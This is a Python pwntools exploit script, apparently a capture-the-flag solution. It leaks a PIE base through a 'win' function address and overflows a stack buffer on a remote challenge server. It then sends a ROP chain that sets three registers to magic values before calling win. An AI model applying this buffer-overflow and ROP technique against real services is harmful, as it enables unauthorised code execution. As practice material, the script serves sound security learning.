from pwn import *

elf = ELF('./chal')
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f'pop rdi; ret : {pop_rdi_ret}')
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]
print(f'pop rsi; ret : {pop_rsi_ret}')
pop_rdx_ret = rop.find_gadget(['pop rdx', 'ret'])[0]
print(f'pop rdx; ret : {pop_rdx_ret}')
ret = rop.find_gadget(['ret'])[0]
print(f'ret : {ret}')
win_addr = elf.symbols['win']
print(f'default win address : {win_addr}')


p = remote('34.170.146.252', 31441)

p.recvuntil(b'address of win function: ')
real_win_addr = int(p.recvline().decode(), 16)
offset = real_win_addr - win_addr
print(f'win adress : {real_win_addr}')

payload = b'A'*(64+8)
payload += p64(pop_rdi_ret+offset)
payload += p64(0xdeadbeefcafebabe)
payload += p64(ret+offset)
payload += p64(pop_rsi_ret+offset)
payload += p64(0x1122334455667788)
payload += p64(ret+offset)
payload += p64(pop_rdx_ret+offset)
payload += p64(0xabcdabcdabcdabcd)
payload += p64(ret+offset)
payload += p64(real_win_addr)

p.recvuntil(b'input >')
p.sendline(payload)
p.interactive()
